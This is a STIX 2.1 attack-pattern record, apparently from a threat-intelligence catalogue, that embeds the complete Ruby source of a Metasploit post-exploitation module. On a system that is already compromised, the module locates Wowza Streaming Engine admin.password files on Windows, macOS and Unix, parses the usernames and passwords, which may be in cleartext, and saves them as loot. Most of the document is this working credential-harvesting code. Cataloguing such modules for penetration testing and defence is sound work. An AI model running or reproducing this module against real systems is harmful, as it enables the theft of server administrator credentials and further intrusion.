{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e70ab621-9ae5-4c64-9d95-282ff2d724c9",
    "created": "2024-08-14T16:33:19.165117Z",
    "modified": "2024-08-14T16:33:19.16512Z",
    "name": "Gather Wowza Streaming Engine Credentials",
    "description": " This module collects Wowza Streaming Engine user credentials.  'License' => MSF_LICENSE 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/wowza_streaming_engine_creds.rb",
            "external_id": "wowza_streaming_engine_creds.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.wowza.com/resources/WowzaStreamingEngine_UsersGuide-4.0.5.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Gather Wowza Streaming Engine Credentials',\n        'Description' => %q{\n          This module collects Wowza Streaming Engine user credentials.\n        },\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://www.wowza.com/docs/use-http-providers-with-the-wowza-streaming-engine-java-api' ],\n          [ 'URL', 'https://www.wowza.com/resources/WowzaStreamingEngine_UsersGuide-4.0.5.pdf' ],\n        ],\n        'Author' => ['bcoles'],\n        'Platform' => %w[win linux osx unix],\n        'SessionTypes' => %w[meterpreter powershell shell],\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n  end\n\n  def parse_admin_config(config_path)\n    return [] if config_path.blank?\n\n    print_status(\"Parsing file #{config_path}\")\n\n    begin\n      config_data = read_file(config_path)\n    rescue StandardError => e\n      print_error(\"Could not read #{config_path} : #{e.message}\")\n      return []\n    end\n\n    if config_data.blank?\n      print_warning('Configuration file is empty')\n      return []\n    end\n\n    # Admin password file (format: [username][space][password][space][groups][space][passwordEncoding])\n    # [groups]= \"admin\" | \"admin|advUser\" | \"basic\".\n    # [passwordEncoding]= \"cleartext\" | \"bcrypt\" | \"digest\". If no value is specified, defaults to \"cleartext\".\n\n    creds = []\n    config_data.each_line do |line|\n      line.strip!\n\n      next if line.blank?\n      next if line.starts_with?('#')\n\n      username, password, groups, encoding = line.split(' ')\n      creds << [username, password, groups, encoding]\n    end\n\n    creds\n  end\n\n  # Application is installed to Program Files\\\\Wowza Media Systems\\\\Wowza Streaming Engine <version>\n  def config_files_win\n    configs = []\n\n    [\n      (get_env('ProgramFiles') || 'C:\\\\Program Files') + '\\\\Wowza Media Systems',\n      (get_env('ProgramW6432') || 'C:\\\\Program Files') + '\\\\Wowza Media Systems',\n      (get_env('ProgramFiles(x86)') || 'C:\\\\Program Files (x86)') + '\\\\Wowza Media Systems',\n      'C:\\\\Program Files\\\\Wowza Media Systems',\n      'C:\\\\Program Files (x86)\\\\Wowza Media Systems',\n    ].uniq.each do |wowza_dir|\n      next unless directory?(wowza_dir)\n\n      dirs = dir(wowza_dir) || []\n\n      dirs.each do |dir|\n        next unless dir.starts_with?('Wowza Streaming Engine')\n\n        config_path = \"#{wowza_dir}\\\\#{dir}\\\\conf\\\\admin.password\"\n        configs << config_path if exists?(config_path)\n      end\n    end\n\n    configs\n  end\n\n  # Application is installed to /Library/WowzaStreamingEngine-<version>\n  # Symlink /Library/WowzaStreamingEngine points to the application directory\n  # and cannot be changed.\n  # https://www.wowza.com/community/t/default-installation-directory/635/2\n  def config_files_osx\n    config_path = '/Library/WowzaStreamingEngine/conf/admin.password'\n    exists?(config_path) ? [config_path] : []\n  end\n\n  # Application is installed to /usr/local/WowzaStreamingEngine-<version>\n  # Symlink /usr/local/WowzaStreamingEngine points to the application directory\n  # and cannot be changed.\n  # https://www.wowza.com/community/t/default-installation-directory/635/2\n  def config_files_unix\n    config_path = '/usr/local/WowzaStreamingEngine/conf/admin.password'\n    exists?(config_path) ? [config_path] : []\n  end\n\n  def run\n    case session.platform\n    when 'windows'\n      configs = config_files_win\n    when 'osx'\n      configs = config_files_osx\n    else\n      configs = config_files_unix\n    end\n\n    fail_with(Failure::NotFound, 'Found no Wowza Streaming Engine admin.password config files') if configs.empty?\n\n    creds = []\n    configs.each do |config|\n      parse_admin_config(config).each { |c| creds << c }\n    end\n\n    fail_with(Failure::NotFound, 'Found no credentials') if creds.empty?\n\n    columns = %w[Username Password Groups Encoding]\n\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Wowza Streaming Engine Credentials',\n      'Columns' => columns\n    )\n\n    creds.uniq.each do |c|\n      tbl << c\n    end\n\n    print_line(tbl.to_s)\n    path = store_loot('host.wowzastreamingengine', 'text/csv', session, tbl.to_csv, 'wowza_creds.csv', 'Wowza Streaming Engine credentials')\n    print_good(\"Credentials stored in: #{path}\")\n  end\nend\n",
    "x_mitre_contributors": [
        "[bcoles]",
        ""
    ],
    "x_mitre_platforms": [
        "%w[win linux osx unix]"
    ]
}